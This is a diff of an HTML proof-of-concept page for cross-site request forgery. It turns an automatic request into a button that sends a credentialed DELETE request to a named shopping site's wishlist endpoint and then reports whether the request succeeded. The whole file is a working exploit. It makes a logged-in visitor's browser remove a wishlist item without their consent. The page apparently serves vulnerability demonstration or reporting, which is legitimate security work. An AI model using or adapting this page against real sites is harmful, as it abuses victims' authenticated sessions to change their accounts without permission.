@@ -2,15 +2,33 @@
 <html>
   <body>
     <h1>CSRF PoC - Remove Wishlist Item</h1>
+    <button onclick="sendRequest()">Remove Item from Wishlist</button>
+    <p id="status"></p>
+
     <script>
-      fetch("https://www.beautyexpert.com/wishlist/removeFrom.collections?fromWishlist=true&productID=12595875", {
-        method: "DELETE",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(["12595875"])
-      }).then(res => console.log("Request sent", res));
+      function sendRequest() {
+        fetch("https://www.beautyexpert.com/wishlist/removeFrom.collections?fromWishlist=true&productID=12595875", {
+          method: "DELETE",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(["12595875"])
+        })
+        .then(res => {
+          if (res.ok) {
+            document.getElementById("status").textContent = "Item successfully removed.";
+            document.getElementById("status").style.color = "green";
+          } else {
+            document.getElementById("status").textContent = "Failed to remove item (HTTP " + res.status + ")";
+            document.getElementById("status").style.color = "red";
+          }
+        })
+        .catch(error => {
+          document.getElementById("status").textContent = "Error: " + error;
+          document.getElementById("status").style.color = "red";
+        });
+      }
     </script>
   </body>
 </html>
